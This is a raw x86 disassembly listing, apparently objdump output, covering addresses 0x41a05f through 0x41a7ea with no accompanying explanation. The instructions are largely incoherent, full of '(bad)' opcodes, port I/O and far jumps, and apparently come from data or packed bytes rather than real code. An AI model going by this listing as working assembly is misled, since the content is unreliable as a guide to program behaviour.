  41a05f:	jno    0x41a0a6
  41a061:	pop    ebx
  41a062:	ins    BYTE PTR es:[edi],dx
  41a063:	cld    
  41a064:	push   esi
  41a065:	fiadd  DWORD PTR [edx+0x6ccb4415]
  41a06b:	jno    0x41a032
  41a06d:	test   eax,0xe76ea79e
  41a072:	out    0x83,al
  41a074:	dec    ecx
  41a075:	nop
  41a076:	imul   eax,DWORD PTR [ebx],0xffffffb0
  41a079:	scas   eax,DWORD PTR es:[edi]
  41a07a:	inc    esi
  41a07b:	in     al,0x4e
  41a07d:	or     ecx,DWORD PTR [esi+0x50cfdb8f]
  41a083:	pop    esi
  41a084:	fdivr  DWORD PTR [esi+0x442f490f]
  41a08a:	mov    ecx,0x14bb17cb
  41a08f:	rcl    BYTE PTR ds:0xefd9da69,0x9c
  41a096:	push   ebp
  41a097:	inc    esi
  41a098:	dec    ebx
  41a099:	test   eax,0x9be2a437
  41a09e:	cmc    
  41a09f:	loope  0x41a116
  41a0a1:	pop    ds
  41a0a2:	jge    0x41a0b5
  41a0a4:	or     DWORD PTR [esi-0x7a8c4c3f],0x5832e052
  41a0ae:	pop    ecx
  41a0af:	loope  0x41a11b
  41a0b1:	scas   eax,DWORD PTR es:[edi]
  41a0b2:	fldenv [ecx-0x14]
  41a0b5:	and    ah,ch
  41a0b7:	mov    al,ds:0x1412e8f6
  41a0bc:	in     al,0xb0
  41a0be:	adc    DWORD PTR [ebx],edx
  41a0c0:	mov    esp,0xeec038da
  41a0c5:	and    ah,al
  41a0c7:	push   cs
  41a0c8:	sahf   
  41a0c9:	ins    BYTE PTR es:[edi],dx
  41a0ca:	cmp    DWORD PTR [edi+esi*8],0xf9e9f188
  41a0d1:	add    eax,0x4f6b7687
  41a0d6:	and    edx,esp
  41a0d8:	xchg   cl,ah
  41a0da:	mov    al,ds:0x1e4a34bc
  41a0df:	pop    esp
  41a0e0:	(bad)  
  41a0e1:	sbb    al,0x18
  41a0e3:	out    dx,eax
  41a0e4:	mov    cl,0xdd
  41a0e6:	and    al,0xcf
  41a0e8:	scas   al,BYTE PTR es:[edi]
  41a0e9:	int    0x53
  41a0eb:	xchg   DWORD PTR [bp+si+0x54],edi
  41a0ef:	cmp    al,0x2e
  41a0f1:	sub    ecx,0xffffff9e
  41a0f4:	dec    edi
  41a0f5:	jp     0x41a0e4
  41a0f7:	cmp    edx,DWORD PTR [eax-0x67c53eb7]
  41a0fd:	sbb    BYTE PTR [edx-0x25787312],0xdb
  41a104:	push   esi
  41a105:	xchg   eax,ebp
  41a107:	push   es
  41a108:	enter  0x4baf,0xe1
  41a10c:	dec    edx
  41a10d:	add    DWORD PTR [edx-0x7a],edi
  41a110:	pop    esi
  41a111:	jmp    0x41a119
  41a113:	aad    0x3f
  41a115:	dec    ebx
  41a116:	push   ebp
  41a117:	cld    
  41a118:	cmc    
  41a119:	jbe    0x41a194
  41a11b:	push   ebp
  41a11c:	out    0xfb,eax
  41a11e:	add    DWORD PTR [ebx],esi
  41a120:	pushf  
  41a121:	push   ds
  41a122:	in     al,0x9
  41a124:	ror    BYTE PTR [edi-0x28],cl
  41a127:	jmp    0x4736d867
  41a12c:	pop    ebx
  41a12d:	mov    dh,0xa4
  41a12f:	(bad)  
  41a130:	pop    esi
  41a131:	push   0xbe6d06e8
  41a136:	shl    bl,cl
  41a138:	int    0x5e
  41a13a:	and    eax,0x675ea150
  41a13f:	shl    esp,0xd4
  41a142:	push   ss
  41a143:	fistp  QWORD PTR [ebx-0x1419b013]
  41a149:	(bad)  
  41a14a:	cld    
  41a14b:	nop
  41a14c:	lds    ebp,FWORD PTR [eax-0x55]
  41a14f:	mov    cl,0x30
  41a151:	push   edx
  41a152:	mov    ebp,0x58fb9dfc
  41a157:	daa    
  41a158:	repz mov dh,0x40
  41a15b:	inc    ebp
  41a15c:	push   edi
  41a15d:	mov    bl,0x16
  41a15f:	pushf  
  41a160:	enter  0x9ffa,0xae
  41a164:	das    
  41a165:	mov    ds:0x455d2c77,eax
  41a16a:	jle    0x41a1cd
  41a16c:	add    BYTE PTR [esi+eiz*8],0xb5
  41a170:	in     al,dx
  41a171:	shl    BYTE PTR [edi-0x54],0x45
  41a175:	push   esi
  41a176:	jmp    0x543176b5
  41a17b:	sbb    eax,0xc9852edd
  41a180:	adc    DWORD PTR [esi],0x14
  41a183:	xor    edi,0x132b1ef7
  41a189:	aam    0x72
  41a18b:	out    0x13,eax
  41a18d:	jb     0x41a151
  41a18f:	mov    esi,0x78f52c86
  41a194:	sti    
  41a195:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a196:	cmc    
  41a197:	mov    ecx,0x27c2e5f4
  41a19c:	xchg   esp,eax
  41a19d:	sti    
  41a19e:	es (bad) 
  41a1a0:	stc    
  41a1a1:	inc    esi
  41a1a2:	les    ecx,FWORD PTR [eax+0x20ec0c9e]
  41a1a8:	lea    ebp,[ebx+esi*4-0x6ff67682]
  41a1af:	test   DWORD PTR [ebp+0x1c0a726c],eax
  41a1b5:	dec    ebp
  41a1b6:	pop    eax
  41a1b7:	ja     0x41a186
  41a1b9:	(bad)  [ebx]
  41a1bb:	not    DWORD PTR [eax-0xdd43cfe]
  41a1c1:	push   ecx
  41a1c2:	cmp    al,0x86
  41a1c4:	lea    eax,[edi-0x5d]
  41a1c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1c8:	dec    ebx
  41a1c9:	adc    DWORD PTR [edx],ebp
  41a1cb:	adc    ah,BYTE PTR [eax-0x4c]
  41a1ce:	fwait
  41a1cf:	sub    al,0x7b
  41a1d1:	rcr    BYTE PTR [edx+0x6e],cl
  41a1d4:	sub    DWORD PTR [ecx+0x11],ecx
  41a1d7:	or     BYTE PTR [esi],dl
  41a1d9:	mov    esi,0xad0b43ae
  41a1de:	sub    eax,0xd6270e71
  41a1e3:	inc    ecx
  41a1e4:	xor    al,0x95
  41a1e6:	fs or  eax,0x66ce0f3a
  41a1ec:	adc    DWORD PTR [esi+0x16e92eb7],0xffffff85
  41a1f3:	js     0x41a194
  41a1f5:	shl    BYTE PTR [edx],1
  41a1f7:	sbb    eax,0x59d19d40
  41a1fc:	adc    eax,0x5bf3c18c
  41a201:	jns    0x41a1ac
  41a203:	mov    dh,0xc1
  41a205:	mov    eax,0x3b98b336
  41a20a:	lahf   
  41a20b:	cld    
  41a20c:	test   ecx,esi
  41a20e:	lahf   
  41a20f:	loopne 0x41a1ce
  41a211:	popa   
  41a212:	neg    ah
  41a214:	xchg   edi,eax
  41a215:	out    0x5a,eax
  41a217:	pop    esp
  41a218:	inc    esi
  41a219:	icebp  
  41a21a:	lods   al,BYTE PTR ds:[esi]
  41a21b:	inc    eax
  41a21c:	cmc    
  41a21d:	(bad)  
  41a21e:	push   ds
  41a21f:	push   ds
  41a220:	inc    esi
  41a221:	inc    eax
  41a222:	and    edi,DWORD PTR [esp+eiz*8+0x2b140568]
  41a229:	jnp    0x41a272
  41a22b:	jbe    0x41a200
  41a22d:	shl    DWORD PTR [edx],1
  41a22f:	mov    ah,0xb6
  41a231:	xchg   ebp,eax
  41a232:	aad    0xc2
  41a234:	cmp    al,0x98
  41a236:	test   dh,ah
  41a238:	inc    edx
  41a239:	mov    esi,0xe932a966
  41a23e:	push   esp
  41a23f:	or     ecx,DWORD PTR [edi+0x1a]
  41a242:	call   0xba41:0x9081b4d8
  41a249:	mov    ebx,0x14a263bb
  41a24e:	test   BYTE PTR [edi-0x4],0x3c
  41a252:	das    
  41a253:	sub    BYTE PTR [eax-0x61],dh
  41a256:	dec    edi
  41a257:	test   DWORD PTR [eax-0x61],ecx
  41a25a:	(bad)  
  41a25b:	imul   edx,DWORD PTR [ecx],0xffffffc3
  41a25e:	test   DWORD PTR [edi+0x15f28a74],eax
  41a264:	outs   dx,BYTE PTR gs:[esi]
  41a266:	mov    esi,DWORD PTR [edi]
  41a268:	(bad)  
  41a269:	lds    esi,FWORD PTR [edi-0x5460834]
  41a26f:	push   eax
  41a270:	fild   DWORD PTR [ecx+0x26]
  41a273:	lea    ebx,[ebx-0x47]
  41a276:	push   ecx
  41a277:	outs   dx,DWORD PTR ds:[esi]
  41a278:	cdq    
  41a279:	cmp    BYTE PTR [ebx],al
  41a27b:	in     eax,dx
  41a27c:	push   0x60
  41a27e:	push   esi
  41a27f:	fld    QWORD PTR [eax-0x2c]
  41a282:	out    0x54,al
  41a284:	outs   dx,DWORD PTR ds:[esi]
  41a285:	enter  0x4e74,0x22
  41a289:	cmp    BYTE PTR [edx-0x4],al
  41a28c:	or     eax,0x7f76b70d
  41a291:	cld    
  41a292:	xchg   BYTE PTR [esp+ebp*4+0x7cbc950b],dh
  41a299:	scas   eax,DWORD PTR es:[edi]
  41a29a:	pusha  
  41a29b:	mov    ds:0xf86ae85c,al
  41a2a0:	sti    
  41a2a1:	es inc eax
  41a2a3:	loopne 0x41a27f
  41a2a5:	jae    0x41a250
  41a2a7:	adc    BYTE PTR [eax-0xf],al
  41a2aa:	in     ax,0x33
  41a2ad:	scas   al,BYTE PTR es:[edi]
  41a2ae:	adc    eax,0x2f1c2a9f
  41a2b3:	add    eax,0x301a2ea5
  41a2b8:	mov    ch,0x55
  41a2ba:	push   ebx
  41a2bb:	in     eax,0x6d
  41a2bd:	repnz (bad) 
  41a2c0:	(bad)  
  41a2c1:	leave  
  41a2c2:	test   eax,0x65a287d4
  41a2c7:	fisttp QWORD PTR [esi-0x517fa442]
  41a2cd:	mov    ds:0x2f942c6e,al
  41a2d2:	mov    cl,0x11
  41a2d4:	mov    ds:0xf248d4fe,al
  41a2d9:	or     ecx,ebp
  41a2db:	js     0x41a354
  41a2dd:	rol    BYTE PTR [ecx],0x6c
  41a2e0:	mov    cl,0x37
  41a2e2:	lods   al,BYTE PTR ds:[esi]
  41a2e3:	and    eax,0xddbb369f
  41a2e8:	or     BYTE PTR [ebp+0x13d93ebc],bl
  41a2ee:	in     eax,dx
  41a2ef:	outs   dx,DWORD PTR ds:[esi]
  41a2f0:	cdq    
  41a2f1:	gs cdq 
  41a2f3:	dec    edi
  41a2f4:	jmp    0x41a33e
  41a2f6:	and    dl,BYTE PTR [ebp-0x1c110f38]
  41a2fc:	test   al,0x53
  41a2fe:	mov    esp,0xac97cc9c
  41a303:	sbb    eax,0x8b754955
  41a308:	mov    eax,DWORD PTR [edi]
  41a30a:	jnp    0x41a383
  41a30c:	jbe    0x41a294
  41a30e:	pop    es
  41a30f:	adc    al,0xeb
  41a311:	xor    esi,DWORD PTR [esi]
  41a313:	lods   eax,DWORD PTR ds:[esi]
  41a314:	add    esp,DWORD PTR cs:[ebx]
  41a317:	inc    esp
  41a318:	dec    esp
  41a319:	sub    edx,esp
  41a31b:	cmp    eax,0xf383e43e
  41a320:	push   ebx
  41a321:	ss jp  0x41a35e
  41a324:	jne    0x41a347
  41a326:	mov    edi,0x6866d1f0
  41a32b:	dec    ebp
  41a32c:	xor    bh,BYTE PTR [esi-0x4462671]
  41a332:	fsubr  DWORD PTR [esi-0x4e]
  41a335:	add    DWORD PTR [ebx],eax
  41a337:	push   ebx
  41a338:	imul   esp,DWORD PTR [edx],0xffffffb5
  41a33b:	pop    es
  41a33c:	or     edi,esp
  41a33e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a33f:	jmp    0x3529a3e1
  41a344:	xor    edx,DWORD PTR [ebp-0x2a]
  41a347:	xor    eax,0x4a149612
  41a34c:	clc    
  41a34d:	jo     0x41a3b7
  41a34f:	inc    edx
  41a350:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a351:	mov    WORD PTR [esi],es
  41a353:	aaa    
  41a354:	xlat   BYTE PTR ds:[ebx]
  41a355:	or     BYTE PTR [edx],dl
  41a357:	mov    bh,0xb9
  41a359:	(bad)  
  41a35a:	mov    BYTE PTR [ecx],ch
  41a35c:	mov    ds:0x71be1bfb,eax
  41a361:	retf   0xd75d
  41a364:	into   
  41a365:	addr16 or eax,0xbadf0a5f
  41a36b:	add    DWORD PTR [ecx],edx
  41a36d:	xor    ebx,ebx
  41a36f:	popa   
  41a370:	hlt    
  41a371:	or     eax,0x45b346bc
  41a376:	sti    
  41a377:	xchg   ebx,eax
  41a378:	(bad)  
  41a379:	je     0x41a370
  41a37b:	rcl    edx,0xc1
  41a37e:	jns    0x41a36f
  41a380:	test   BYTE PTR [ecx],0x9f
  41a383:	push   ebp
  41a384:	mov    al,0x89
  41a386:	popf   
  41a387:	out    dx,al
  41a388:	xor    DWORD PTR [edi+0x6],ecx
  41a38b:	imul   ebp,eax,0xa07f4278
  41a391:	mov    ds:0x33b5c3b2,al
  41a396:	popa   
  41a397:	jg     0x41a32e
  41a399:	imul   BYTE PTR ds:0x181e1dd2
  41a39f:	dec    esp
  41a3a0:	aas    
  41a3a1:	cmp    ecx,DWORD PTR [edi+0x2c]
  41a3a4:	(bad)  
  41a3a6:	xlat   BYTE PTR ds:[ebx]
  41a3a7:	pop    cx
  41a3a9:	dec    edi
  41a3aa:	fmul   DWORD PTR [edi]
  41a3ac:	call   0xcc242603
  41a3b1:	nop
  41a3b2:	mov    ch,BYTE PTR [esi]
  41a3b4:	lock inc esp
  41a3b6:	ja     0x41a431
  41a3b8:	jge    0x41a368
  41a3ba:	je     0x41a3b0
  41a3bc:	in     al,dx
  41a3bd:	and    al,0xa3
  41a3bf:	pop    ss
  41a3c0:	icebp  
  41a3c1:	mov    cl,0xe8
  41a3c3:	push   es
  41a3c4:	cmp    BYTE PTR [esi+0x44fcb01f],0x5f
  41a3cb:	into   
  41a3cc:	jmp    0x5e530464
  41a3d1:	js     0x41a36b
  41a3d3:	fdiv   QWORD PTR [ecx]
  41a3d5:	loopne 0x41a35d
  41a3d7:	cmp    al,0x44
  41a3d9:	or     esi,edx
  41a3db:	loopne 0x41a40b
  41a3dd:	sub    eax,0x85f9c9fe
  41a3e2:	(bad)
  41a3e5:	aam    0xc0
  41a3e7:	clc    
  41a3e8:	push   ebp
  41a3e9:	push   ecx
  41a3ea:	out    dx,eax
  41a3eb:	push   cs
  41a3ec:	adc    DWORD PTR [esi],0xffffffb1
  41a3ef:	stos   BYTE PTR es:[edi],al
  41a3f0:	push   DWORD PTR es:[edi-0x47b06f2d]
  41a3f7:	out    dx,eax
  41a3f8:	or     al,0xd
  41a3fa:	vmread DWORD PTR [esi],edi
  41a3fd:	out    dx,eax
  41a3fe:	and    ebp,ebx
  41a400:	sub    al,0x7f
  41a402:	je     0x41a440
  41a404:	sbb    ah,BYTE PTR [edx+0x5d77d79]
  41a40a:	mov    edi,0xda8083fc
  41a40f:	aaa    
  41a410:	push   ebx
  41a411:	cmp    BYTE PTR [bp-0x31a7],bh
  41a416:	test   edx,esp
  41a418:	out    dx,al
  41a419:	lock add dl,BYTE PTR [edi-0x65]
  41a41d:	mov    al,0x60
  41a41f:	retf   0x6d7a
  41a422:	mov    eax,0xeec1bda7
  41a427:	cdq    
  41a428:	push   fs
  41a42a:	mov    edx,0x9cd0a6f4
  41a42f:	cld    
  41a430:	adc    DWORD PTR [ecx+0x7e],esi
  41a433:	ret    
  41a434:	pop    ss
  41a435:	and    dh,BYTE PTR [edi-0x40]
  41a438:	mov    ds:0x4d7c044d,eax
  41a43d:	cwde   
  41a43e:	xchg   ebp,eax
  41a43f:	test   BYTE PTR [ebp-0x305eb565],cl
  41a445:	or     al,0xb9
  41a447:	push   ss
  41a448:	out    dx,eax
  41a449:	out    dx,al
  41a44a:	mov    ds:0x9e8f4b11,al
  41a44f:	mov    bl,0xa1
  41a451:	push   ss
  41a452:	loopne 0x41a3e4
  41a454:	cmp    ecx,esp
  41a456:	adc    eax,0xe47bdb0a
  41a45b:	mov    bl,cl
  41a45d:	pop    ds
  41a45e:	aam    0xf6
  41a460:	(bad)  
  41a461:	stos   DWORD PTR es:[edi],eax
  41a462:	fidiv  DWORD PTR [esi+0x1d]
  41a465:	(bad)  
  41a467:	cdq    
  41a468:	pop    eax
  41a469:	fisttp DWORD PTR [eax]
  41a46b:	sub    al,BYTE PTR [ebp+0x2016eea4]
  41a471:	push   ss
  41a472:	rcr    DWORD PTR [edx+0x7d],1
  41a475:	or     bh,al
  41a477:	lahf   
  41a478:	loopne 0x41a4b4
  41a47a:	out    0x7b,al
  41a47c:	sahf   
  41a47d:	mov    dl,0xd3
  41a47f:	pop    ds
  41a480:	aaa    
  41a481:	mov    eax,0x45ca8bbe
  41a486:	adc    ah,ch
  41a488:	jb     0x41a425
  41a48a:	stos   DWORD PTR es:[edi],eax
  41a48b:	call   0x894d:0x17252bfa
  41a492:	call   FWORD PTR [ecx-0x21]
  41a495:	or     al,0x91
  41a497:	ficom  WORD PTR ds:0xa39c4a97
  41a49d:	sub    DWORD PTR [esi-0x4bd8b365],edx
  41a4a3:	je     0x41a43a
  41a4a5:	add    eax,0xc0207a9e
  41a4aa:	inc    ebp
  41a4ab:	fldcw  WORD PTR [esi-0xea6dfaf]
  41a4b1:	mov    esi,0xf8f67a20
  41a4b6:	out    dx,eax
  41a4b7:	and    DWORD PTR [edx+edi*8+0x79323a96],esi
  41a4be:	or     bl,BYTE PTR [ebp-0x22]
  41a4c1:	imul   eax,DWORD PTR [eax],0x17
  41a4c4:	mov    bh,0x7b
  41a4c6:	retf   0x39e3
  41a4c9:	cmp    al,0xa1
  41a4cb:	add    dh,BYTE PTR [ebx-0x26]
  41a4ce:	jp     0x41a53d
  41a4d0:	retf   
  41a4d1:	(bad)  
  41a4d2:	and    BYTE PTR [ecx],cl
  41a4d4:	retf   0xe636
  41a4d7:	xchg   ebx,eax
  41a4d8:	(bad)  
  41a4d9:	int3   
  41a4da:	stos   BYTE PTR es:[edi],al
  41a4db:	fldenv [edi]
  41a4dd:	dec    eax
  41a4de:	mov    ds:0xf934ea08,al
  41a4e3:	gs aam 0xe
  41a4e6:	mov    esp,0x2592468d
  41a4eb:	xchg   edi,eax
  41a4ec:	sbb    eax,0x11de98b8
  41a4f1:	cld    
  41a4f2:	daa    
  41a4f3:	add    eax,0x25db0f73
  41a4f8:	lods   eax,DWORD PTR ds:[esi]
  41a4f9:	push   edi
  41a4fa:	das    
  41a4fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4fc:	adc    eax,0x40ffbe1
  41a501:	iret   
  41a502:	mov    BYTE PTR [ebp-0x4addc176],dl
  41a508:	std    
  41a509:	mov    al,0xc6
  41a50b:	add    DWORD PTR [edi-0x3f],edx
  41a50e:	sub    cl,BYTE PTR [eax-0x1a45560a]
  41a514:	clc    
  41a515:	push   0xffffffd7
  41a517:	sub    edx,DWORD PTR [ecx-0x5d0ed088]
  41a51d:	ret    
  41a51e:	pop    es
  41a51f:	sahf   
  41a520:	loope  0x41a4b1
  41a522:	xor    BYTE PTR [edi+0x71a1556f],al
  41a528:	sub    ebx,DWORD PTR [esi-0x57]
  41a52b:	sbb    al,BYTE PTR [esi+esi*4]
  41a52e:	or     cl,BYTE PTR [ebp+0x4f]
  41a531:	mov    eax,ds:0x3ee2cdca
  41a536:	xchg   edx,eax
  41a537:	(bad)  
  41a538:	rol    BYTE PTR [edx+eiz*2],cl
  41a53b:	jl     0x41a50d
  41a53d:	jne    0x41a584
  41a53f:	(bad)  
  41a540:	pop    ebp
  41a541:	fdivr  DWORD PTR [edi-0x26]
  41a544:	dec    ebx
  41a545:	mov    edx,0xefe2bf2a
  41a54a:	mov    DWORD PTR [ecx+ebx*4+0x45],ecx
  41a54e:	arpl   WORD PTR [ebx+0x640cfa75],bp
  41a554:	retf   0x8ff3
  41a557:	jecxz  0x41a56a
  41a559:	mov    ch,BYTE PTR ds:0x90cdafd7
  41a55f:	pop    DWORD PTR [edi+0x64]
  41a562:	dec    eax
  41a563:	cmp    ecx,DWORD PTR gs:[edx+0x5c26436f]
  41a56a:	dec    ch
  41a56c:	mov    ecx,0x33f74d1a
  41a571:	add    ebx,eax
  41a573:	push   eax
  41a574:	out    0xc7,eax
  41a576:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a577:	stos   DWORD PTR es:[edi],eax
  41a578:	xchg   edx,eax
  41a579:	mov    bh,0x3c
  41a57b:	cmp    BYTE PTR [eax+0x57e596cd],al
  41a581:	imul   edi,DWORD PTR [ebp-0x44a17a01],0x52
  41a588:	scas   al,BYTE PTR es:[edi]
  41a589:	push   eax
  41a58a:	add    eax,0x7197fdfe
  41a58f:	adc    eax,0xfe1c98d6
  41a594:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a595:	fidivr WORD PTR [edi]
  41a597:	xchg   ebx,eax
  41a598:	imul   esp,DWORD PTR [edx+0x7b],0xffffffab
  41a59c:	sbb    DWORD PTR [esi],ebx
  41a59e:	push   esp
  41a59f:	lahf   
  41a5a0:	mov    WORD PTR [esi+0x3d],cs
  41a5a3:	fs adc eax,0x43f4e616
  41a5a9:	out    dx,al
  41a5aa:	test   eax,0x4b2e9f41
  41a5af:	jle    0x41a592
  41a5b1:	mov    ah,0xae
  41a5b3:	add    al,0x59
  41a5b5:	into   
  41a5b6:	arpl   di,si
  41a5b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5b9:	outs   dx,DWORD PTR ds:[esi]
  41a5ba:	addr16 es daa 
  41a5bd:	fwait
  41a5be:	aad    0x73
  41a5c0:	push   edx
  41a5c1:	iret   
  41a5c2:	test   DWORD PTR [esp+edx*2+0x45],eax
  41a5c6:	mov    al,0xb0
  41a5c8:	gs push ebx
  41a5ca:	mov    DWORD PTR [ebx+0x6501232a],ebp
  41a5d0:	jg     0x41a565
  41a5d2:	rcl    edx,cl
  41a5d4:	xor    ah,0x11
  41a5d7:	xor    al,0x13
  41a5d9:	leave  
  41a5da:	daa    
  41a5db:	adc    al,BYTE PTR [ebx+0x10896b2c]
  41a5e1:	inc    edx
  41a5e2:	adc    DWORD PTR [edi-0x32],ebx
  41a5e5:	mov    al,ds:0xbc3941d1
  41a5ea:	mov    ds:0xd3efc8b9,al
  41a5ef:	ins    DWORD PTR es:[edi],dx
  41a5f0:	jns    0x41a5e8
  41a5f2:	js     0x41a63b
  41a5f4:	xor    DWORD PTR [ebx-0x69],edx
  41a5f7:	dec    ebp
  41a5f8:	or     ch,0x93
  41a5fb:	add    DWORD PTR [eax-0x6],edi
  41a5fe:	outs   dx,DWORD PTR ds:[esi]
  41a5ff:	or     BYTE PTR [eax-0x73],dl
  41a602:	test   eax,0xb6da0cac
  41a607:	addr16 (bad) 
  41a609:	ins    BYTE PTR es:[edi],dx
  41a60a:	push   0xffffffd5
  41a60c:	gs jge 0x41a620
  41a60f:	and    DWORD PTR [ecx-0x2e],0xf47da49
  41a616:	xor    esi,DWORD PTR [eax+0x46]
  41a619:	in     eax,0x9c
  41a61b:	sub    BYTE PTR [ebx-0x5de0c035],dh
  41a621:	push   esp
  41a622:	mov    eax,0xf5149d70
  41a627:	outs   dx,BYTE PTR ds:[esi]
  41a628:	je     0x41a698
  41a62a:	icebp  
  41a62b:	repz dec esi
  41a62d:	jno    0x41a6aa
  41a62f:	jg     0x41a652
  41a631:	pushf  
  41a632:	aam    0x92
  41a634:	jmp    0x41a646
  41a636:	push   ecx
  41a637:	sub    ecx,edi
  41a639:	push   esi
  41a63a:	jae    0x41a607
  41a63c:	pop    eax
  41a63d:	xor    esi,DWORD PTR [edx-0x57def60c]
  41a643:	nop
  41a644:	sbb    ch,BYTE PTR [ebx]
  41a646:	inc    ecx
  41a647:	xor    DWORD PTR [ebx],0x71
  41a64a:	call   0xca03cc23
  41a64f:	push   esp
  41a650:	pop    esp
  41a651:	call   0x49931577
  41a656:	dec    eax
  41a657:	addr16 std 
  41a659:	enter  0x1953,0x79
  41a65d:	sahf   
  41a65e:	mov    esp,0x8f21fa93
  41a663:	mov    ?,ecx
  41a665:	cmc    
  41a666:	xor    eax,0x8ed2c8da
  41a66b:	sub    ecx,esi
  41a66d:	call   0x6ce:0x6143274a
  41a674:	push   ds
  41a675:	add    al,0xf1
  41a677:	xchg   DWORD PTR [esi+0x14],eax
  41a67a:	popf   
  41a67b:	aam    0xb2
  41a67d:	jmp    0x50176084
  41a682:	jae    0x41a6d3
  41a684:	repz jne 0x41a6b8
  41a687:	add    al,0xc6
  41a689:	addr16 retf 
  41a68b:	arpl   cx,dx
  41a68d:	or     edi,ebx
  41a68f:	and    eax,0x2d052417
  41a694:	ror    DWORD PTR [edx-0x579710fc],cl
  41a69a:	jnp    0x41a682
  41a69c:	(bad)  
  41a69d:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41a69f:	call   0x3356:0xdde9d0d2
  41a6a6:	mov    ds:0x7a922392,eax
  41a6ab:	retf   0xe84d
  41a6ae:	setb   BYTE PTR [esi-0x75]
  41a6b2:	xor    al,0x7b
  41a6b4:	mov    ch,0xd1
  41a6b6:	mov    edi,0x874093c2
  41a6bb:	pop    ss
  41a6bc:	push   ebx
  41a6bd:	in     al,0x98
  41a6bf:	aaa    
  41a6c0:	add    ch,BYTE PTR [ebp+0xce50bab]
  41a6c6:	shr    DWORD PTR [esi+eiz*1],0x8d
  41a6ca:	inc    edx
  41a6cb:	cmp    eax,0x9c184098
  41a6d0:	pop    ss
  41a6d1:	cdq    
  41a6d2:	retf   0x45c9
  41a6d5:	xchg   edi,eax
  41a6d6:	shl    BYTE PTR [edi+ebx*1-0x7f],cl
  41a6da:	pop    eax
  41a6db:	dec    edi
  41a6dc:	je     0x41a72a
  41a6de:	addr16 xchg edi,eax
  41a6e0:	mov    dl,0xab
  41a6e2:	stos   DWORD PTR es:[edi],eax
  41a6e3:	cmp    eax,0x6285db26
  41a6e8:	mov    al,0x77
  41a6ea:	bnd jmp 0x41a71a
  41a6ed:	popf   
  41a6ee:	nop
  41a6ef:	xor    edx,DWORD PTR [eax+0x78]
  41a6f2:	sar    ebx,1
  41a6f4:	dec    ecx
  41a6f5:	addr16 (bad) 
  41a6f8:	out    dx,eax
  41a6f9:	sbb    bh,dh
  41a6fb:	fsub   QWORD PTR [ebx]
  41a6fd:	and    al,0x0
  41a6ff:	out    0x2a,eax
  41a701:	mov    BYTE PTR [eax+0x3],al
  41a704:	xlat   BYTE PTR ds:[ebx]
  41a705:	push   edi
  41a706:	dec    ebp
  41a707:	dec    edx
  41a708:	not    BYTE PTR [eax-0xb1358bb]
  41a70e:	fwait
  41a70f:	push   ebx
  41a710:	outs   dx,DWORD PTR ds:[esi]
  41a711:	mov    bh,0x79
  41a713:	mov    ds:0xd58543da,al
  41a718:	ins    DWORD PTR es:[edi],dx
  41a719:	jne    0x41a741
  41a71b:	push   es
  41a71c:	jnp    0x41a722
  41a71e:	and    bl,BYTE PTR [edi-0x1ee2eb77]
  41a724:	je     0x41a6fe
  41a726:	fisttp WORD PTR [eax]
  41a728:	aas    
  41a729:	xchg   ecx,eax
  41a72a:	cmp    ecx,DWORD PTR ds:0x54d4e8a4
  41a730:	loope  0x41a77c
  41a732:	mov    ebx,0x88dfadb5
  41a737:	xchg   edi,eax
  41a738:	lea    eax,ds:0xbbf0cfde
  41a73e:	xor    ebx,DWORD PTR [ebx+0x13]
  41a741:	clc    
  41a742:	adc    ecx,esp
  41a744:	add    cl,BYTE PTR [eax+0x35]
  41a747:	mov    ebx,DWORD PTR [edx+0x77]
  41a74a:	sbb    edi,0x40b2db0
  41a750:	push   ds
  41a751:	test   eax,0xadc052e0
  41a756:	test   eax,0xbb5510f1
  41a75b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a75c:	js     0x41a7c8
  41a75e:	dec    ebx
  41a75f:	or     al,0xf0
  41a761:	lds    ecx,FWORD PTR [edi]
  41a763:	enter  0x38ed,0xb3
  41a767:	iret   
  41a768:	lods   eax,DWORD PTR ds:[esi]
  41a769:	lock mov bl,0x11
  41a76c:	lds    eax,FWORD PTR [edi+0x74c626ec]
  41a772:	gs sti 
  41a774:	jnp    0x41a778
  41a776:	cmp    al,0x26
  41a778:	adc    BYTE PTR [ecx+ecx*1+0x622e9f6f],cl
  41a77f:	adc    BYTE PTR [ecx+0x72dd7a39],cl
  41a785:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a786:	or     DWORD PTR [ebx+0x27],esp
  41a789:	xchg   ebp,eax
  41a78a:	loop   0x41a72a
  41a78c:	shr    BYTE PTR [edx+0x3],1
  41a78f:	scas   eax,DWORD PTR es:[edi]
  41a790:	mul    BYTE PTR [ebx]
  41a792:	push   esp
  41a793:	mov    ebp,0xdd54f019
  41a798:	jmp    0xbddd:0x342b05c
  41a79f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7a0:	retf   
  41a7a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7a2:	jmp    0x41a7ae
  41a7a4:	mov    ds:0x25706912,al
  41a7a9:	adc    al,0x1
  41a7ab:	sbb    DWORD PTR [eax],0xfdeb36d
  41a7b1:	aaa    
  41a7b2:	adc    DWORD PTR [eax+0x67],eax
  41a7b5:	add    eax,0xbdacbcc1
  41a7ba:	inc    ebx
  41a7bb:	(bad)  
  41a7bd:	xor    eax,0x5be8e1a6
  41a7c2:	and    eax,0xf3040c1d
  41a7c7:	jmp    0x74f4:0x53617f2a
  41a7ce:	jns    0x41a764
  41a7d0:	clc    
  41a7d1:	clc    
  41a7d2:	mov    ch,0x30
  41a7d4:	cld    
  41a7d5:	rol    edx,1
  41a7d7:	iret   
  41a7d8:	pop    edx
  41a7d9:	(bad)  
  41a7da:	das    
  41a7db:	and    dh,al
  41a7dd:	pop    es
  41a7de:	addr16 into 
  41a7e0:	mov    WORD PTR [ecx],es
  41a7e2:	mov    esi,0xdf40d857
  41a7e7:	or     ebx,DWORD PTR [ecx-0x14]
  41a7ea:	and    al,ch
